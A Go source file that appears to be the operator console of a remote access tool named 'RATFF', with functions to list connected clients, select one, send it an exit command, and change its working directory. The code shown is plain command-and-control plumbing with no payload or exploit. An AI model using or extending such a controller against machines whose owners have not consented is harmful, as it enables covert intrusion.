package main

import (
	"time"

	"RATFF/shared"
)

// listClients fetches and displays connected clients.
func listClients() {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	PrintClientTable(clients)
}

// selectClient validates and selects a client by ID.
func selectClient(id string) bool {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return false
	}

	for _, c := range clients {
		if c.ID == id {
			PrintSuccess(Tf("selected_client", id))
			return true
		}
	}

	PrintError(T("client_not_exists"))
	return false
}

// deleteClient sends an exit command to the specified client.
func deleteClient(id string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "exit",
	}
	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_exit_failed", err))
		return
	}

	PrintSuccess(T("delete_success"))
}

// cdClient changes the working directory of a remote client.
func cdClient(id string, dir string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "cd",
		"payload":   map[string]interface{}{"dir": dir},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				PrintError(Tf("cd_failed", errMsg))
			} else if currentDir, ok := msg.Payload["current_dir"].(string); ok {
				PrintSuccess(Tf("cd_success", dir, currentDir))
			}
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}
